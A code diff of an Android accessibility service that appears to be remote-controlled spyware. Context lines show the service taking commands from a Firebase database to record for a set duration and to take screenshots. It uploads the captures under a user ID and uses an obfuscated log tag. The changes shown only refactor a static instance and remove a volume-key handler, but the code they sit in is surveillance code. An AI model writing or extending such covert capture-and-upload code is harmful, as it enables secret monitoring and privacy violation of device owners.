@@ -12,7 +12,6 @@ import android.os.Looper;
 import android.os.Parcelable;
 import android.util.Log;
 import android.view.Display;
-import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
 
@@ -40,8 +39,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     String TAG = "ijsfnidshf";
 
-    public static accessibilityService instance;
-
     FirebaseDatabase mdb;
     DatabaseReference reference;
 
@@ -56,7 +53,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         info.notificationTimeout = 100;
         setServiceInfo(info);
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
-        instance = this;
     }
 
     @Override
@@ -88,8 +84,8 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                                 case 2:
                                     long value = Long.parseLong(title.replaceAll("[\\D]", ""));
                                     final Handler handler = new Handler(Looper.getMainLooper());
-                                    accessibilityService.instance.startRecording();
-                                    handler.postDelayed(() -> accessibilityService.instance.stopRecording(UserID), value);
+                                    startRecording();
+                                    handler.postDelayed(() -> stopRecording(UserID), value);
                                     break;
                             }
                         }
@@ -97,23 +93,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                 }
             }
         }
-    }
-
-    @Override
-    protected boolean onKeyEvent(KeyEvent event) {
-        int action = event.getAction();
-        int keyCode = event.getKeyCode();
-
-        if (action == KeyEvent.ACTION_UP) {
-            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
-                Log.d(TAG, "KeyUp");
-                instance = this;
-            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
-                Log.d(TAG, "KeyDown");
-                instance = this;
-            }
-        }
-        return super.onKeyEvent(event);
     }
 
     @Override
@@ -148,7 +127,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                             Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                             Log.d(TAG, String.valueOf(bitmap));
 
-                            saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.instance, reference, taskSuccess);
+                            saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.this, reference, taskSuccess);
                             String filename = getRandom.getRandom(0, 1000000000) + ".png";
                             saveBitmap.saveData(filename, UserID);
                         }
@@ -166,7 +145,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                     });
         } else {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                performGlobalAction(instance.GLOBAL_ACTION_TAKE_SCREENSHOT);
+                performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
                 ScreenshotObserver screenshotObserver = new ScreenshotObserver();
                 screenshotObserver.Observer(UserID, taskSuccess, reference);
             }
